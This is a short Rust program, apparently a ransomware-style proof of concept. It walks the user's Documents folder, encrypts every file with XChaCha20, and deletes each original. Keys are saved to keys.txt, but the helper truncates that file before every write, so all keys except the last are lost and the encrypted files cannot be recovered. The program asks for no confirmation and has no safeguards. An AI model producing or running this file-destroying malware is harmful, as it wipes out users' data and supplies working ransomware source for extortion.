use std::io::Write;
use std::{fs, path::Path};
use std::path::PathBuf;
use anyhow::{Result, Ok};
use orion::aead;
use dirs::document_dir;

const ENCRYPTED_EXTENSION:	&str	= ".🔒";
const KEY_FILE_NAME:		&str	= "keys.txt";

type CipherAndKey = (Vec<u8>, aead::SecretKey);

// TODO: use streams
// current code isn't capable of encrypting giant files due
// to having to load the whole file into memory


fn main() -> Result<()> {
	let target_dir = document_dir().unwrap();
	let mut keyfile_loc = target_dir.clone();
	keyfile_loc.push(KEY_FILE_NAME);
	let keyfile_loc = keyfile_loc; // make immutable

	dbg!(&target_dir);

	let entries = fs::read_dir(target_dir)?;
	for entry in entries {
		let path = entry?.path();

		if path.is_file() {
			encrypt_file(path, keyfile_loc.as_path())?;
		}
	}

	Ok(())
}

fn encrypt_file(path: PathBuf, keyfile_loc: &Path) -> Result<()> {
	let file_name = path.file_name().unwrap().to_string_lossy();

	if !file_name.ends_with(ENCRYPTED_EXTENSION) {
		let encrypted_path = PathBuf::from(
			format!("{}{}", path.display(), ENCRYPTED_EXTENSION)
		);

		dbg!(&file_name);
		dbg!(&encrypted_path);
		dbg!(&path);

		// Prepare new file data
		let content = fs::read(&path)?;
		let (ciphertext, key) = encrypt_xchacha20(&content[..])?;

		println!("among us");

		// Write encrypted data to new file
		fs::write(&encrypted_path, &ciphertext[..])?;

		println!("Write successful");

		append_file(keyfile_loc, key.unprotected_as_bytes())?;
		
		println!("Key append successful");

		fs::remove_file(&path)?;

		dbg!(&file_name);
		dbg!(&encrypted_path);
		dbg!(&path);
		println!("k.");
	}

	Ok(())
}

fn encrypt_xchacha20(src: &[u8]) -> Result<CipherAndKey> {
	// check this: https://docs.rs/orion/latest/orion/aead/index.html

	let secret_key = aead::SecretKey::default();
	let ciphertext = aead::seal(&secret_key, src)?;
	//let decrypted_data = aead::open(&secret_key, &ciphertext)?;

	Ok(
		(ciphertext, secret_key)
	)
}

fn append_file<F: AsRef<Path>>(path: F, data: &[u8]) -> Result<()> {
	fs::write(&path, &[])?;

	let mut file = fs::OpenOptions::new()
		.append(true)
		.create(true)
		.open(&path)?;

	file.write(data)?;

	Ok(())
}
